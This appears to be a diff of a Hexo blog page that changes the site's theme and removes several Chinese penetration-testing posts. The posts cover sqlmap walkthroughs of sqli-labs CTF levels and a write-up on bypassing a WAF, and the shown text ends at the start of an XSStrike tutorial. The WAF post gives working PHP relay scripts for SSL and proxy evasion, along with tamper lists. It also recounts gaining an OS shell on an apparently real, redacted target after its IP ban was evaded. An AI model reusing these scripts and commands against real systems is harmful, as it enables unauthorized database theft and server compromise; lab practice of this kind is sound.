@@ -1,732 +1,1171 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
   
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/page/6/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
+<meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
+<meta name="twitter:card" content="summary_large_image">
   
   
   
-<link rel="stylesheet" href="/css/style.css">
+  <title>Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/image/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
 
   
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
-
 <meta name="generator" content="Hexo 7.3.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>我的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <a class="main-nav-link" href="/">Home</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
         
-      </nav>
-      <nav id="sub-nav">
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
         
         
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-Web/工具使用/sqlmap/sqlmap通关sqli-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/sqlmap%E9%80%9A%E5%85%B3sqli-labs/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="sqlmap通关sqli-labs"><a href="#sqlmap通关sqli-labs" class="headerlink" title="sqlmap通关sqli-labs"></a>sqlmap通关sqli-labs</h1><h2 id="基础注入"><a href="#基础注入" class="headerlink" title="基础注入"></a>基础注入</h2><blockquote>
-<p>&#x3D;&#x3D;获取用户：&#x3D;&#x3D;​<code>root@localhost</code>​</p>
-<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 --current-user</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取当前数据库：&#x3D;&#x3D;</p>
-<p>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 --current-db</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取数据库：&#x3D;&#x3D;​<code>ctftraining</code>​</p>
-<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 --dbs</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取表：&#x3D;&#x3D;​<code>flag、news、users</code></p>
-<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 -D ctftraining --tables</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取所有字段&#x3D;&#x3D;获取admin表里的字段<br>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 -D maoshe -T admin --columns</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取字段值&#x3D;&#x3D;<br>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 -D maoshe -T admin -C Id,password,username --dump</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取flag：&#x3D;&#x3D;</p>
-<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 -D ctftraining -T flag --dump</code>​</p>
-</blockquote>
-<p>‍</p>
-<h2 id="POST型注入"><a href="#POST型注入" class="headerlink" title="POST型注入"></a>POST型注入</h2><blockquote>
-<p>使用BP抓包&#x3D;&#x3D;获取post报文&#x3D;&#x3D;，保存在&#x3D;&#x3D;txt文件&#x3D;&#x3D;里、&#x3D;&#x3D;-r代表文档&#x3D;&#x3D;，文档内容就是你的&#x3D;&#x3D;post报文&#x3D;&#x3D; –batch 自动选择yes、<br>获取到我们熟知的关键数据库：ctftraining</p>
-<p>​<code>sqlmap -r post_sqlmap.txt --batch -dbs</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取表：&#x3D;&#x3D;​<code>flag、news、users</code>​</p>
-<p>​<code>sqlmap -r 1.txt --batch -D ctftraining --tables</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;获取flag：&#x3D;&#x3D;</p>
-<p>​<code>sqlmap -r 1.txt --batch -D ctftraining -T flag --dump</code>​</p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/sqlmap%E9%80%9A%E5%85%B3sqli-labs/" data-id="cmaxygi13002joc7ke62143sg" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/工具使用/sqlmap/绕过WAF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/%E7%BB%95%E8%BF%87WAF/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h1><p>通过前期的信息收集发现存在注入的页面如下：</p>
-<p><img src="/.com//image-20250519105437-67lcu06.png" alt="image">​</p>
-<p>直接使用sqlmap跑发现出现如下错误：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://xxxx?&amp;daxxtae=null&amp;parame=xxxxxx&quot;</span> --batch --delay=1 --random-agent</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.5.4.7#dev&#125;</span></span><br><span class="line"><span class="string">|_ -| . [)]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&quot;</span>]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 10:12:10 /2021-10-10/</span></span><br><span class="line"><span class="string">[10.12.10] [INFO] parsing HTTP request from &#x27;</span>49<span class="string">&#x27;</span></span><br><span class="line"><span class="string">custom injection marking character (&#x27;</span>*<span class="string">&#x27;) found in option &#x27;</span>--data<span class="string">&#x27;. Do you want to process it?  [Y/n/q]Y</span></span><br><span class="line"><span class="string">[10:12:10] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[10:12:10] [CRITICAL] can&#x27;</span>t establish SSL connection</span><br></pre></td></tr></table></figure>
-
-<p>一看无法建立SSL连接，好不容易发现一个注入点，难道就这样放弃了吗？先百度一波，看看SSL证书原理，就用一张图来理解更直接明了。</p>
-<p><img src="/.com//image-20250519105507-ukeg78l.png" alt="image">​</p>
-<p>那么遇到这样的情况要怎么绕呢？在sqlmap中没有<strong>绕过SSL证书的参数</strong>，思考了很长时间，终于想起来原来貌似有一个<strong>中转注入</strong>。这里要解决的第一个问题是<strong>有哪些脚本语言</strong>能够在<strong>请求网址时忽略SSL证书</strong>，第二个问题是我还需要使用sqlmap中的payload，这两个都要满足，通过查询了解到<strong>PHP可以使用参数来忽略SSL证书</strong>，由于并不是搞开发的，所以这里还是思考了很长时间，先来理解一下中转注入的原理吧。</p>
-<h2 id="中转注入的原理"><a href="#中转注入的原理" class="headerlink" title="中转注入的原理"></a>中转注入的原理</h2><p>首先我们我们来分析一下sqlmap中转注入的原理，如下图：</p>
-<p><img src="/.com//image-20250519105817-iacne5p.png" alt="image"></p>
-<p>为了让大家更加容易解，先使用简单的脚本演示一遍，演示代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload=base64_encode($_GET[&#x27;x&#x27;]);//对中转脚本接收的参数进行base64编码</span><br><span class="line">echo $payload</span><br><span class="line">$urls=&quot;http://xxx/xxxx?q=1$payload&quot;;//对请求的网址拼接base64编码的字符串</span><br><span class="line">file_get_contents($urls);//请求目标网站</span><br><span class="line">echo $urls;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>网上随便找需一个后面有参数的网站，添加到$urls变量中，将上述代码放在本地服务器中，然后访问，可以看到成功请求到我们添加的网站</p>
-<p><img src="/.com//image-20250519105913-j8otsss.png" alt="image"></p>
-<p>使用sqlmap跑一下,设置一下代理使用burp来抓包</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://127.0.0.1/zhongzhuan.php?x=1&quot;  -v 3 --proxy=http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-
-<p>成功看到各种payload</p>
-<p><img src="/.com//image-20250519105939-j5atbu9.png" alt="image">​</p>
-<p><img src="/.com//image-20250519105942-idplwtr.png" alt="image">​</p>
-<p>burp抓包的结果</p>
-<p><img src="/.com//image-20250519110013-trheljz.png" alt="image"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit(0); </span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]; </span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>,<span class="variable">$id</span>); </span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;%3D&quot;</span>,<span class="variable">$id</span>); //这些编码机制可以自己的需求设定，毕竟实战的环境变换多样</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://xxxx?&amp;daxxtae=null&amp;parame=<span class="variable">$id</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$url</span>;</span><br><span class="line"><span class="variable">$ch</span> = curl_init(); </span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;<span class="variable">$url</span>&quot;</span>); </span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, FALSE);//https请求 不验证hosts</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, 1); // 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, 0);//如果你想把一个头包含在输出中，设置这个选项为一个非零值  </span><br><span class="line"><span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>); </span><br><span class="line">curl_close(<span class="variable">$ch</span>); </span><br><span class="line">print_r(<span class="variable">$output</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>此时中转脚本已经写好了，用sqlmap跑，没想到呀，既然<strong>流量有限制</strong>，就算请求延迟调得很慢，还是直接将我的ip给封了，此时又是一个漫长的过程，又要继续思考了，在sqlmap中有代理设置参数，哈哈哈这都知道，但是试了试一试不可以，一直思考呀，首先我们借助了中转脚本，先请求的是我们的本地服务器，你说外网的代理服务器直接访问我本地服务器这是一个不现实的问题，最主要是我没有公网服务器，不然就好办了，所以现在需要思考两个问题，首先我要用到中转脚本过证书问题，还要能够使用代理，在PHP代码上使用代理池设置。此时sqlmap先请求我们中转脚本（并没有用代理地址），中转脚本借助设置的代理地址迟访问目标网页。<br>现在代码修改成了如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit(0); </span><br><span class="line">$id=$_GET[&quot;id&quot;]; </span><br><span class="line">$id=str_replace(&quot; &quot;,&quot;%20&quot;,$id); </span><br><span class="line">$id=str_replace(&quot;=&quot;,&quot;%3D&quot;,$id); </span><br><span class="line">$url = &quot;http://xxxx?&amp;daxxtae=null&amp;parame=$id&quot;;</span><br><span class="line">echo $url;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, &quot;$url&quot;); </span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_PROXY, &#x27;proxy.xxxx.com&#x27;); //代理服务器地址</span><br><span class="line">curl_setopt($ch, CURLOPT_PROXYPORT, &#x27;8080&#x27;); //代理服务器端口</span><br><span class="line">$output = curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line">print_r($output);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在使用sqlmap跑的时候最好先本地测试一下，经过了20多分钟的扫描终于算是出东西了</p>
-<p><img src="/.com//image-20250519110300-nyf9oiz.png" alt="image"></p>
-<p>直接看一下能否写shell，搞个高危，运气就是这么好</p>
-<p>​<code>python2 sqlmap.py -u &quot;http://xxxx?&amp;daxxtae=null&amp;param=xxx&quot; --batch --delay=1 --random-agent --os-shell</code>​</p>
-<p>成功拿到了dba权限</p>
-<p><img src="/.com//image-20250519110715-qe4ru0n.png" alt="image">​</p>
-<p>成功执行命令，不过是真的慢，可能是有防护软件原因吧。</p>
-<p><img src="/.com//image-20250519110742-cmuyky0.png" alt="image">​</p>
-<p>在这里问题又来了，要是post型注入又该怎么办呢？上面的脚本似乎不在使用思考了很长时间，但是也没有在实际中遇到，所以这里就想本地尝试一次。</p>
-<h1 id="post型中转注入"><a href="#post型中转注入" class="headerlink" title="post型中转注入"></a>post型中转注入</h1><p>在注入天书中有post型注入，随便选了一个11关卡，抓取less-11关的包，注入点在登录框这里。</p>
-<p><img src="/.com//image-20250519110755-7sxmsol.png" alt="image">​</p>
-<p>注入点为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=hhh&amp;submit=Submit</span><br></pre></td></tr></table></figure>
-
-<p>构造中转脚本如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;http://192.168.1.104/sqli/Less-11/index.php&quot;;</span><br><span class="line">$sql = $_GET[s];//获取中转脚本传过来的payload </span><br><span class="line">$s = urlencode($sql);</span><br><span class="line">$params = &quot;uname=admin$s&amp;passwd=aa&quot;;</span><br><span class="line">$ch = curl_init();// 创建一个新cURL资源</span><br><span class="line"> curl_setopt($ch, CURLOPT_URL, $url);//这是你想用PHP取回的URL地址，可以在用curl_init()函数初始化时设置这个选项</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);//https请求 不验证hosts</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);//如果你想把一个头包含在输出中，设置这个选项为一个非零值   </span><br><span class="line">curl_setopt($ch, CURLOPT_USERAGENT, &#x27;Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)&#x27;);// 在HTTP请求中自定义一个”user-agent”头的字符串</span><br><span class="line">curl_setopt($ch, CURLOPT_TIMEOUT, 15);//为了应对目标服务器的过载，下线，或者崩溃等可能状况。</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, 1);    // post 提交方式</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $params);</span><br><span class="line">// 抓取URL并把它传递给浏览器 </span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">// 关闭cURL资源，并且释放系统资源</span><br><span class="line">curl_close($ch);</span><br><span class="line">$a = strlen($output);</span><br><span class="line">//echo $a;</span><br><span class="line">if($a==2846)&#123;</span><br><span class="line">    echo &quot;1&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;2&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>使用sqlmap进行注入</p>
-<p><img src="/.com//image-20250519110828-p0favmb.png" alt="image"></p>
-<p>首先注入我们的中转脚本</p>
-<p><img src="/.com//image-20250519110836-i2fb0fc.png" alt="image"></p>
-<p>中转脚本通过获取的payload请求目标网站</p>
-<p><img src="/.com//image-20250519110843-hjlrfhm.png" alt="image"></p>
-<p>成功跑出数据库</p>
-<p><img src="/.com//image-20250519110854-nljxinj.png" alt="image">​</p>
-<p>‍</p>
-<h1 id="sqlmap绕过WAF的思路总结"><a href="#sqlmap绕过WAF的思路总结" class="headerlink" title="sqlmap绕过WAF的思路总结"></a>sqlmap绕过WAF的思路总结</h1><p><strong>1、设置请求头</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--user-agent=&quot;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&quot;</span><br></pre></td></tr></table></figure>
-
-<p><strong>2、设置代理</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--proxy=http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-
-<p><strong>3、设置延迟</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--delay=1</span><br></pre></td></tr></table></figure>
-
-<p><strong>4、利用–tamper参数中的编码脚本</strong><br>常见编码搭配方式<br>普通tamper搭配方式:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes</span><br></pre></td></tr></table></figure>
-
-<p>数据库为MYSQL的搭配方式:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes</span><br></pre></td></tr></table></figure>
-
-<p>数据库为MySql的搭配方式:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor</span><br></pre></td></tr></table></figure>
-
-<p><strong>5、自己编写中转脚本</strong></p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/%E7%BB%95%E8%BF%87WAF/" data-id="cmaxygi14002koc7kcncu2h3n" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/工具使用/xsstrike/使用教程" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h1><h3 id="扫描单个网址"><a href="#扫描单个网址" class="headerlink" title="扫描单个网址"></a>扫描单个网址</h3><blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“</p>
-</blockquote>
-<h3 id="测试-URL-路径组件"><a href="#测试-URL-路径组件" class="headerlink" title="测试 URL 路径组件"></a>测试 URL 路径组件</h3><p>选项：–path</p>
-<p>在 URL 路径中注入有效负载</p>
-<blockquote>
